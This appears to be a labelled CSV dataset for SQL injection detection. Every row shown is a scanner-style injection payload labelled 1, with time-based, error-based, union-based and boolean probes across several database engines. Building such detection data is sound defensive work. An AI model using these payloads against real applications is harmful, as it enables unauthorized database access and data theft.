Data,Label
"1' or char   (   68   )   ||char   (   69   )   ||char   (   97   )   ||char   (   85   )      =   regexp_substring   (   repeat   (   right   (   char   (   5389   )   ,0   )   ,5000000000   )   ,null   )    and 'uwep'   =   'uwep",1
"-4291""    )      )     or 5023   =   ctxsys.drithsx.sn   (   5023,   (   chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   5023   =   5023   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )       )    and     (      (    ""xyhi""   =   ""xyhi",1
"1' in boolean mode   )    and 3707   =      (   select count   (   *   )    from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )   #",1
"1%"" or 1022   =      (   select count   (   *   )    from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )   --",1
"call regexp_substring   (   repeat   (   left   (   crypt_key   (   char   (   65   )   ||char   (   69   )   ||char   (   83   )   ,null   )   ,0   )   ,500000000   )   ,null   )    and     (      (    ""pawh""   =   ""pawh",1
  (   1589   =   1589   )   *1,1
"select count   (   *   )    from generate_series   (   1,5000000   )    and     (      (    7240   =   7240",1
1    )      )       )    and 3715 in     (      (    char   (   113   )   +char   (   113   )   +char   (   112   )   +char   (   106   )   +char   (   113   )   +   (   select    (   case when    (   3715   =   3715   )    then char   (   49   )    else char   (   48   )    end    )      )    +char   (   113   )   +char   (   122   )   +char   (   118   )   +char   (   122   )   +char   (   113    )      )       )    and     (      (       (   9548   =   9548,1
1    )      )     and 6240   =      (   'qqpjq'||   (   select case 6240 when 6240 then 1 else 0 end from rdb$database   )   ||'qzvzq'   )    and     (      (    6406   =   6406,1
-5021'+   (   select yadq where 4285   =   4285 order by 1#,1
1%' and 4386   =   utl_inaddr.get_host_address   (   chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   4386   =   4386   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )     and '%'   =   ',1
"1""   )    or 6793   =      (   select 6793 from pg_sleep   (   5    )      )     and    (   ""baia""   =   ""baia",1
"1""   )    and 3824   =   benchmark   (   5000000,md5   (   0x76555642    )      )     and    (   ""jozh""   =   ""jozh",1
"-9508   )    union all select 9950,9950,9950,9950,9950,9950,9950#",1
"1    )      )     or 8514   =   benchmark   (   5000000,md5   (   0x544d5a4c    )      )    #",1
"-1064' or make_set   (   6439   =   2937,2937   )    and 'qojd'   =   'qojd",1
1'   )    as rbpx where 1264   =   1264,1
"1%'    )      )       )    or exp   (   ~   (   select * from    (   select concat   (   0x7171706a71,   (   select    (   elt   (   6270   =   6270,1    )      )       )   ,0x717a767a71,0x78    )      )    x    )      )     and     (      (       (   '%'   =   '",1
if   (   8284   =   6171   )    select 8284 else drop function mbih--,1
1    )      )     or sleep   (   5   )   #,1
"-7868""    )      )     or 9323   =   9323#",1
"1'   )    as ekjw where 5477   =   5477 union all select null,null,null,null,null--",1
"1"" where 2462   =   2462 and 2716   =      (   select count   (   *   )    from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )   --",1
"select like   (   'abcdefg',upper   (   hex   (   randomblob   (   500000000/2    )      )        )      )     and     (      (       (   'mfib'   =   'mfib",1
1    )      )     or 4240   =      (   select 4240 from pg_sleep   (   5    )      )    --,1
1%' and 4595   =   4595#,1
1'   )    as oknw where 8777   =   8777,1
"1"" where 6501   =   6501",1
"1   )    and char   (   111   )   ||char   (   77   )   ||char   (   121   )   ||char   (   88   )      =   regexp_substring   (   repeat   (   left   (   crypt_key   (   char   (   65   )   ||char   (   69   )   ||char   (   83   )   ,null   )   ,0   )   ,500000000   )   ,null   )    and    (   8929   =   8929",1
-7999   )    or 8422   =   1336,1
-5742' where 1314   =   1314 or 5903   =      (   'qqpjq'||   (   select case 5903 when 5903 then 1 else 0 end from rdb$database   )   ||'qzvzq'   )   --,1
"1    )      )     as potk where 5040   =   5040 or elt   (   5873   =   5873,sleep   (   5    )      )    #",1
"-4605""   )    union all select 8542,8542,8542,8542,8542,8542,8542,8542--",1
"select count   (   *   )    from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (   'njnr'   =   'njnr",1
select case when 6558   =   4327 then 1 else null end--,1
-7535   )    or 2724 in     (      (    char   (   113   )   +char   (   113   )   +char   (   112   )   +char   (   106   )   +char   (   113   )   +   (   select    (   case when    (   2724   =   2724   )    then char   (   49   )    else char   (   48   )    end    )      )    +char   (   113   )   +char   (   122   )   +char   (   118   )   +char   (   122   )   +char   (   113    )      )       )  ,1
" end and     (      (    ""rqay"" like ""rqay",1
"-2312'    )      )       )    union all select 5282,5282,5282,5282,5282,5282,5282,5282--",1
"1%""    )      )     and 8594   =      (   select 8594 from pg_sleep   (   5    )      )    --",1
select    (   case when    (   8993   =   8846   )    then 8993 else 8993*   (   select 8993 from mysql.db   )    end   )   #,1
"select count   (   *   )    from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (   '%'   =   '",1
"select pg_sleep   (   5   )    and    (   ""%""   =   """,1
"call regexp_substring   (   repeat   (   right   (   char   (   3702   )   ,0   )   ,500000000   )   ,null   )    and     (      (    4142   =   4142",1
"-8153'   )    as qhlb where 4948   =   4948 union all select 4948,4948,4948,4948,4948,4948#",1
-7319 or 4493   =   utl_inaddr.get_host_address   (   chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   4493   =   4493   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )  ,1
"1'    )      )     as bedq where 8781   =   8781 or 8466   =   benchmark   (   5000000,md5   (   0x694a4745    )      )    --",1
"1%""   )    and 2006   =   2006",1
"-5139    )      )     union all select 3373,3373,3373,3373,3373,3373,3373,3373#",1
"1 or 4411   =      (   select count   (   *   )    from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )   # zcyc",1
"1'   )    as rvch where 1863   =   1863 or 8384   =   like   (   'abcdefg',upper   (   hex   (   randomblob   (   500000000/2    )      )        )      )    --",1
"1 and 8514   =      (   select count   (   *   )    from domain.domains as t1,domain.columns as t2,domain.tables as t3   )   -- loao",1
-9446    )      )     as wmrq where 3705   =   3705 union all select 3705#,1
"iif   (   7889   =   5114,1,1/0   )   ",1
"select dbms_pipe.receive_message   (   chr   (   66   )   ||chr   (   67   )   ||chr   (   79   )   ||chr   (   101   )   ,5   )    from dual and    (   'ztmd'   =   'ztmd",1
"1""    )      )     union all select null,null,null,null,null,null,null,null#",1
"1%'    )      )     and char   (   109   )   ||char   (   79   )   ||char   (   70   )   ||char   (   90   )      =   regexp_substring   (   repeat   (   right   (   char   (   5012   )   ,0   )   ,5000000000   )   ,null   )   --",1
"1%'   )    and elt   (   4249   =   4249,7259   )    and    (   '%'   =   '",1
1'   )    where 4867   =   4867 rlike    (   select    (   case when    (   7689   =   7689   )    then 1 else 0x28 end    )      )    --,1
if   (   8858   =   5680   )    select 8858 else drop function pyuo--,1
"1    )      )       )    procedure analyse   (   extractvalue   (   9255,concat   (   0x5c,   (   benchmark   (   5000000,md5   (   0x52515a50    )      )        )      )       )   ,1   )    and     (      (       (   1748   =   1748",1
"1""    )      )     as klie where 2840   =   2840 or 8514   =   benchmark   (   5000000,md5   (   0x544d5a4c    )      )    #",1
-3859   )    or 3440   =   cast    (      (    chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113    )      )    ||   (   select    (   case when    (   3440   =   3440   )    then 1 else 0 end    )      )    ::text||   (   chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )     as numeric   )    and    (   5846   =   5846,1
" end and    (   ""qkkn"" like ""qkkn",1
1    )      )     as pzoo where 8036   =   8036 or 6793   =      (   select 6793 from pg_sleep   (   5    )      )    --,1
-2120'   )    or 8734   =   8844#,1
"1""    )      )     as lomw where 9257   =   9257 union all select null,null,null,null,null,null--",1
"1   )    where 6784   =   6784 and elt   (   3114   =   3114,sleep   (   5    )      )    #",1
"1'+   (   select syrz where 7699   =   7699 union all select null,null,null#",1
1   )    and 4595   =   4595#,1
"-4984%""    )      )       )    union all select 6980,6980,6980,6980,6980,6980,6980,6980#",1
"-5224'   )    where 1962   =   1962 union all select 1962,1962,1962,1962,1962,1962,1962,1962,1962--",1
"1' and 8514   =      (   select count   (   *   )    from domain.domains as t1,domain.columns as t2,domain.tables as t3   )   ",1
"1'||   (   select 'gboi' where 4191   =   4191 and 8514   =      (   select count   (   *   )    from domain.domains as t1,domain.columns as t2,domain.tables as t3    )      )    ||'",1
"1""    )      )       )    union all select null,null,null,null,null--",1
"1' or 2633   =   dbms_pipe.receive_message   (   chr   (   112   )   ||chr   (   65   )   ||chr   (   65   )   ||chr   (   103   )   ,5   )    and 'xmnd'   =   'xmnd",1
"1'    )      )       )    and row   (   6237,7469   )   >   (   select count   (   *   )   ,concat   (   0x7171706a71,   (   select    (   elt   (   6237   =   6237,1    )      )       )   ,0x717a767a71,floor   (   rand   (   0   )   *2    )      )    x from    (   select 5192 union select 3785 union select 3931 union select 7158   )   a group by x   )    and     (      (       (   'ejul'   =   'ejul",1
"-3721'   )    union all select 9050,9050--",1
"1""   )    as paai where 4089   =   4089 and 3707   =      (   select count   (   *   )    from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )   --",1
"1""    )      )     and elt   (   3114   =   3114,sleep   (   5    )      )    #",1
1%'   )    order by 1--,1
"-9281   )    where 8363   =   8363 or make_set   (   8220   =   5127,5127   )   --",1
"1""   )    where 6671   =   6671 or char   (   119   )   ||char   (   100   )   ||char   (   99   )   ||char   (   121   )      =   regexp_substring   (   repeat   (   right   (   char   (   1441   )   ,0   )   ,5000000000   )   ,null   )   --",1
" end and    (   ""vwbx""   =   ""vwbx",1
"1' in boolean mode   )    and 8189   =      (   select count   (   *   )    from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )   --",1
1'    )      )     rlike sleep   (   5   )    and     (      (    'iwct'   =   'iwct,1
-7562   )    or 8571   =   8571--,1
"-3707""    )      )       )    or 8571   =   8571--",1
1'+   (   select twyt where 3376   =   3376 and 7756   =   dbms_utility.sqlid_to_sqlhash    (      (    chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   7756   =   7756   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )        )      )    +',1
"call regexp_substring   (   repeat   (   right   (   char   (   3702   )   ,0   )   ,500000000   )   ,null   )    and     (      (    ""eevk""   =   ""eevk",1
1   )    and 3754   =      (   select upper   (   xmltype   (   chr   (   60   )   ||chr   (   58   )   ||chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   3754   =   3754   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113   )   ||chr   (   62    )      )       )    from dual   )  ,1
"1""    )      )     as vbpl where 3885   =   3885 and 6969   =      (   select 6969 from pg_sleep   (   5    )      )    --",1
select pg_sleep   (   5   )    and     (      (    'enpn' like 'enpn,1
"1""   )    where 2136   =   2136 or 7552   =      (   select count   (   *   )    from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )   --",1
1'   )    where 7629   =   7629 rlike    (   select * from    (   select   (   sleep   (   5    )      )       )   vwyq   )   #,1
1%'   )    or    (   select * from    (   select   (   sleep   (   5    )      )       )   sddo   )   #,1
select    (   case when    (   1275   =   7674   )    then 1275 else 1275*   (   select 1275 from information_schema.character_sets   )    end   )   #,1
"1""   )    as duvm where 6190   =   6190 order by 1--",1
-8665' or 6825   =   7840 and 'vbsy' like 'vbsy,1
"1%' or 2633   =   dbms_pipe.receive_message   (   chr   (   112   )   ||chr   (   65   )   ||chr   (   65   )   ||chr   (   103   )   ,5   )    and '%'   =   '",1
"1'||   (   select 'bnaz' from dual where 7168   =   7168 and 2716   =      (   select count   (   *   )    from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )   --",1
1'||   (   select 'tfqg' from dual where 9862   =   9862 and    (   select * from    (   select   (   sleep   (   5    )      )       )   gcrr   )   #,1
"-7686%""   )    or 1 group by concat   (   0x7171706a71,   (   select    (   case when    (   4232   =   4232   )    then 1 else 0 end    )      )    ,0x717a767a71,floor   (   rand   (   0   )   *2    )      )     having min   (   0   )   #",1
1'   )    and    (   7603   =   3634   )   *3634,1
"1' where 3612   =   3612 and    (   select 9067 from   (   select count   (   *   )   ,concat   (   0x7171706a71,   (   select    (   elt   (   9067   =   9067,1    )      )       )   ,0x717a767a71,floor   (   rand   (   0   )   *2    )      )    x from information_schema.character_sets group by x   )   a   )   --",1
"1%""    )      )     and 7533   =   7533 and     (      (    ""%""   =   """,1
-3834'    )      )     as hhiy where 2086   =   2086 or 3038   =   3038,1
"-7371'   )    union all select 4531,4531,4531#",1
select    (   case when    (   1039   =   5127   )    then 1039 else 1039*   (   select 1039 from information_schema.character_sets   )    end   )   #,1
"1    )      )       )    or 9643   =      (   select count   (   *   )    from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    and     (      (       (   8814   =   8814",1
select case when 1574   =   5523 then 1 else null end--,1
"1 procedure analyse   (   extractvalue   (   5840,concat   (   0x5c,0x7171706a71,   (   select    (   case when    (   5840   =   5840   )    then 1 else 0 end    )      )    ,0x717a767a71    )      )    ,1   )   ",1
"-4785""    )      )       )    or 1 group by concat   (   0x7171706a71,   (   select    (   case when    (   4232   =   4232   )    then 1 else 0 end    )      )    ,0x717a767a71,floor   (   rand   (   0   )   *2    )      )     having min   (   0   )   #",1
"select like   (   'abcdefg',upper   (   hex   (   randomblob   (   500000000/2    )      )        )      )     and     (      (    'nimx'   =   'nimx",1
"1'||   (   select 'kojx' from dual where 8140   =   8140 and 2388   =   benchmark   (   5000000,md5   (   0x6d457153    )      )    #",1
select    (   case when    (   2161   =   4328   )    then 2161 else 2161*   (   select 2161 from mysql.db   )    end   )   #,1
"-9854   )    or 5023   =   ctxsys.drithsx.sn   (   5023,   (   chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   5023   =   5023   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )       )    and    (   5696   =   5696",1
1'    )      )     as kahn where 1361   =   1361 or    (   select * from    (   select   (   sleep   (   5    )      )       )   sddo   )   #,1
"-3596'   )    union all select 5349,5349,5349,5349,5349,5349#",1
"1%'    )      )       )    or row   (   1045,7562   )   >   (   select count   (   *   )   ,concat   (   0x7171706a71,   (   select    (   elt   (   1045   =   1045,1    )      )       )   ,0x717a767a71,floor   (   rand   (   0   )   *2    )      )    x from    (   select 8488 union select 5584 union select 3051 union select 1210   )   a group by x   )    and     (      (       (   '%'   =   '",1
"1""    )      )     as uaxn where 5657   =   5657 rlike    (   select    (   case when    (   3548   =   7206   )    then 1 else 0x28 end    )      )    --",1
"-4670""    )      )     or 3038   =   3038",1
"select count   (   *   )    from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",1
"1' in boolean mode   )    or 8421   =      (   select count   (   *   )    from generate_series   (   1,5000000    )      )    #",1
1'   )    where 2753   =   2753 and    (   2739   =   8047   )   *8047--,1
1'+   (   select 'ljtl' where 1766   =   1766,1
-3921'   )    as audo where 7087   =   7087 or 1755   =   4937--,1
"-2072""   )    as rjcz where 2491   =   2491 or 6872   =   6872--",1
1'   )    as llug where 2244   =   2244 and 3715 in     (      (    char   (   113   )   +char   (   113   )   +char   (   112   )   +char   (   106   )   +char   (   113   )   +   (   select    (   case when    (   3715   =   3715   )    then char   (   49   )    else char   (   48   )    end    )      )    +char   (   113   )   +char   (   122   )   +char   (   118   )   +char   (   122   )   +char   (   113    )      )       )   --,1
"1'    )      )     or 6979   =   like   (   'abcdefg',upper   (   hex   (   randomblob   (   500000000/2    )      )        )      )    --",1
-7187' or 4159   =   7465,1
"1' or extractvalue   (   1297,concat   (   0x5c,0x7171706a71,   (   select    (   elt   (   1297   =   1297,1    )      )       )   ,0x717a767a71    )      )     and 'ytlf'   =   'ytlf",1
"1""   )    or extractvalue   (   1297,concat   (   0x5c,0x7171706a71,   (   select    (   elt   (   1297   =   1297,1    )      )       )   ,0x717a767a71    )      )     and    (   ""cdnc"" like ""cdnc",1
select    (   case when    (   3855   =   3855   )    then 3855 else 1/   (   select 0   )    end   )   --,1
"select like   (   'abcdefg',upper   (   hex   (   randomblob   (   500000000/2    )      )        )      )     and    (   'dthp'   =   'dthp",1
"1"" and    (   select 2*   (   if    (      (    select * from    (   select concat   (   0x7171706a71,   (   select    (   elt   (   3484   =   3484,1    )      )       )   ,0x717a767a71,0x78    )      )    s   )   , 8446744073709551610, 8446744073709551610    )      )       )    and ""tfok"" like ""tfok",1
1'   )    where 6622   =   6622 order by 1--,1
"1' and exp   (   ~   (   select * from    (   select concat   (   0x7171706a71,   (   select    (   elt   (   8190   =   8190,1    )      )       )   ,0x717a767a71,0x78    )      )    x    )      )     and 'kwhs' like 'kwhs",1
"1' or 4411   =      (   select count   (   *   )    from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    and 'rhzy'   =   'rhzy",1
"1'+   (   select 'yzxc' where 5230   =   5230    (   select    (   case when    (   4587   =   4587   )    then regexp_substring   (   repeat   (   left   (   crypt_key   (   char   (   65   )   ||char   (   69   )   ||char   (   83   )   ,null   )   ,0   )   ,500000000   )   ,null   )    else char   (   76   )   ||char   (   65   )   ||char   (   102   )   ||char   (   72   )    end   )    from    (   values   (   0    )      )        )      )    +'",1
"1'+   (   select 'sbvh' where 8539   =   8539 and 3707   =      (   select count   (   *   )    from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3    )      )    +'",1
"-7813""    )      )     as yvyl where 5172   =   5172 union all select 5172,5172#",1
1'||   (   select 'uiyj' from dual where 8320   =   8320,1
select    (   case when    (   4111   =   1992   )    then 4111 else 1/   (   select 0   )    end   )   --,1
"select count   (   *   )    from generate_series   (   1,5000000   )    and ""xcjt""   =   ""xcjt",1
"1 where 1096   =   1096 and extractvalue   (   7982,concat   (   0x5c,0x7171706a71,   (   select    (   elt   (   7982   =   7982,1    )      )       )   ,0x717a767a71    )      )    --",1
"-9011""    )      )     or 1 group by concat   (   0x7171706a71,   (   select    (   case when    (   4232   =   4232   )    then 1 else 0 end    )      )    ,0x717a767a71,floor   (   rand   (   0   )   *2    )      )     having min   (   0   )   #",1
1'    )      )     as plbt where 4368   =   4368 and 3754   =      (   select upper   (   xmltype   (   chr   (   60   )   ||chr   (   58   )   ||chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   3754   =   3754   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113   )   ||chr   (   62    )      )       )    from dual   )   --,1
"1   )    and 6414   =      (   select count   (   *   )    from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )   ",1
"1""   )    and 5556   =      (   select count   (   *   )    from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    and    (   ""dppw"" like ""dppw",1
1'||   (   select 'zyvk' from dual where 2072   =   2072,1
-5918'   )    as olzc where 5992   =   5992 or 4390   =   9085,1
"-9795   )    as wrgs where 5427   =   5427 union all select 5427,5427,5427,5427,5427,5427--",1
1' where 6913   =   6913 and 4386   =   utl_inaddr.get_host_address   (   chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   4386   =   4386   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )    --,1
"-5243"" where 2105   =   2105 or 4144   =      (   select upper   (   xmltype   (   chr   (   60   )   ||chr   (   58   )   ||chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   4144   =   4144   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113   )   ||chr   (   62    )      )       )    from dual   )   --",1
-6637'    )      )     order by 1#,1
"select dbms_pipe.receive_message   (   chr   (   66   )   ||chr   (   67   )   ||chr   (   79   )   ||chr   (   101   )   ,5   )    from dual and ""ulfr"" like ""ulfr",1
"1'+   (   select 'rryx' where 1228   =   1228 union all select null,null,null,null,null,null,null,null,null#",1
"1'    )      )     or elt   (   5873   =   5873,sleep   (   5    )      )    #",1
1   )    and 6240   =      (   'qqpjq'||   (   select case 6240 when 6240 then 1 else 0 end from rdb$database   )   ||'qzvzq'   )    and    (   3945   =   3945,1
"1   )    as biup where 1414   =   1414 union all select null,null,null,null,null,null,null,null#",1
"-5827""   )    as lskq where 7683   =   7683 union all select 7683,7683,7683,7683,7683#",1
"select dbms_pipe.receive_message   (   chr   (   66   )   ||chr   (   67   )   ||chr   (   79   )   ||chr   (   101   )   ,5   )    from dual   )   ||'",1
"-3697'    )      )       )    union all select 5180,5180,5180,5180,5180,5180,5180--",1
"1""   )    where 7010   =   7010 and 9660   =      (   select count   (   *   )    from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )   --",1
1'    )      )       )    and 4386   =   utl_inaddr.get_host_address   (   chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   4386   =   4386   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )     and     (      (       (   'smrw' like 'smrw,1
1' and 5967   =   4184#,1
1'||   (   select 'cclo' from dual where 6823   =   6823 and 9198   =   9198--,1
1' where 7191   =   7191 rlike sleep   (   5   )   --,1
"1'    )      )     and make_set   (   8245   =   9872,9872   )    and     (      (    'kzgt'   =   'kzgt",1
"1' and    (   select 2*   (   if    (      (    select * from    (   select concat   (   0x7171706a71,   (   select    (   elt   (   3484   =   3484,1    )      )       )   ,0x717a767a71,0x78    )      )    s   )   , 8446744073709551610, 8446744073709551610    )      )       )    and 'wjwn'   =   'wjwn",1
"1'    )      )     or char   (   117   )   ||char   (   111   )   ||char   (   105   )   ||char   (   100   )      =   regexp_substring   (   repeat   (   left   (   crypt_key   (   char   (   65   )   ||char   (   69   )   ||char   (   83   )   ,null   )   ,0   )   ,500000000   )   ,null   )    and     (      (    'acly' like 'acly",1
"1""   )    where 1330   =   1330 or    (   select * from    (   select   (   sleep   (   5    )      )       )   ydpu   )   --",1
"1   )    where 7199   =   7199 and 8407   =      (   select count   (   *   )    from generate_series   (   1,5000000    )      )    --",1
"1%""    )      )     and 3707   =      (   select count   (   *   )    from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    and     (      (    ""%""   =   """,1
"-9514    )      )     as xdkw where 4975   =   4975 union all select 4975,4975,4975,4975#",1
"1 and 6537   =   dbms_pipe.receive_message   (   chr   (   76   )   ||chr   (   116   )   ||chr   (   117   )   ||chr   (   65   )   ,5   )   -- kfqs",1
"1'||   (   select 'wyng' from dual where 2157   =   2157 union all select null,null--",1
1'   )    and 6240   =      (   'qqpjq'||   (   select case 6240 when 6240 then 1 else 0 end from rdb$database   )   ||'qzvzq'   )    and    (   'vhqm'   =   'vhqm,1
"1'+   (   select 'zohk' where 5502   =   5502 or 2367   =      (   select count   (   *   )    from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )   --",1
-6865   )    or    (   8459   =   8459   )   *4906 and    (   6107   =   6107,1
"1%""    )      )     and updatexml   (   3393,concat   (   0x2e,0x7171706a71,   (   select    (   elt   (   3393   =   3393,1    )      )       )   ,0x717a767a71   )   ,1161   )    and     (      (    ""%""   =   """,1
"1'+   (   select 'qrml' where 3791   =   3791 or 8384   =   like   (   'abcdefg',upper   (   hex   (   randomblob   (   500000000/2    )      )        )      )       )   +'",1
1'    )      )     as eymg where 7000   =   7000,1
"1%'    )      )       )    and updatexml   (   3393,concat   (   0x2e,0x7171706a71,   (   select    (   elt   (   3393   =   3393,1    )      )       )   ,0x717a767a71   )   ,1161   )    and     (      (       (   '%'   =   '",1
"1%""    )      )       )    or 8514   =   benchmark   (   5000000,md5   (   0x544d5a4c    )      )    #",1
"-1065    )      )     union all select 7437,7437,7437,7437,7437,7437,7437,7437--",1
-1603'    )      )     or 5903   =      (   'qqpjq'||   (   select case 5903 when 5903 then 1 else 0 end from rdb$database   )   ||'qzvzq'   )    and     (      (    'abmo'   =   'abmo,1
"1',   (   select    (   case when    (   2106   =   2106   )    then    (   select count   (   *   )    from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    else 2106*   (   select 2106 from master..sysdatabases   )    end    )      )    ",1
"1%"" and 2388   =   benchmark   (   5000000,md5   (   0x6d457153    )      )    #",1
"1 where 7051   =   7051 or 4411   =      (   select count   (   *   )    from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )   --",1
"1'   )    where 6672   =   6672 union all select null,null,null,null,null,null,null,null,null,null--",1
-3899'   )    where 8152   =   8152 or 3440   =   cast    (      (    chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113    )      )    ||   (   select    (   case when    (   3440   =   3440   )    then 1 else 0 end    )      )    ::text||   (   chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )     as numeric   )   --,1
"1""   )    and    (   3020   =   3020   )   *6703 and    (   ""hkjf""   =   ""hkjf",1
"1%""    )      )       )    and 7533   =   7533 and     (      (       (   ""%""   =   """,1
"1%""   )    and    (   6016   =   4763   )   *4763 and    (   ""%""   =   """,1
"1""    )      )       )    or elt   (   5873   =   5873,sleep   (   5    )      )    #",1
"call regexp_substring   (   repeat   (   right   (   char   (   3702   )   ,0   )   ,500000000   )   ,null   )    and     (      (    ""%""   =   """,1
"1%' or 8384   =   like   (   'abcdefg',upper   (   hex   (   randomblob   (   500000000/2    )      )        )      )     and '%'   =   '",1
"-3829%""   )    union all select 2218,2218,2218,2218,2218,2218,2218--",1
"-8629 where 8049   =   8049 union all select 8049,8049,8049,8049,8049,8049,8049#",1
"1"" or elt   (   6272   =   6272,sleep   (   5    )      )    ",1
"1%'    )      )       )    and 2388   =   benchmark   (   5000000,md5   (   0x6d457153    )      )    #",1
"1%'    )      )     and elt   (   3114   =   3114,sleep   (   5    )      )    #",1
1'   )    rlike sleep   (   5   )   #,1
-3598   )    union all select 2264#,1
select    (   case when    (   9455   =   6007   )    then 9455 else 9455*   (   select 9455 from mysql.db   )    end   )   #,1
